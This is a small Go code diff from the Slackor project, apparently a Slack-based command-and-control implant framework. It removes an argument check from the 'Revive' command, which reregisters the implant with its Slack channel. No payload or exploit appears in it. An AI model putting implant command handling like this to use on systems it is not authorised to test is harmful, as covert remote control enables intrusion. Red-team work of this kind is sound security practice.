@@ -1,7 +1,6 @@
 package common
 
 import (
-	"errors"
 	"fmt"
 
 	"github.com/Coalfire-Research/Slackor/internal/slack"
@@ -18,9 +17,6 @@ func (r Revive) Name() string {
 
 // Run reregisters the implant with the channel
 func (r Revive) Run(clientID string, jobID string, args []string) (string, error) {
-	if len(args) != 1 {
-		return "", errors.New("revive takes 1 argument")
-	}
 	slack.Register(clientID)
 	return fmt.Sprintf("Reregistering %s.", clientID), nil
 }
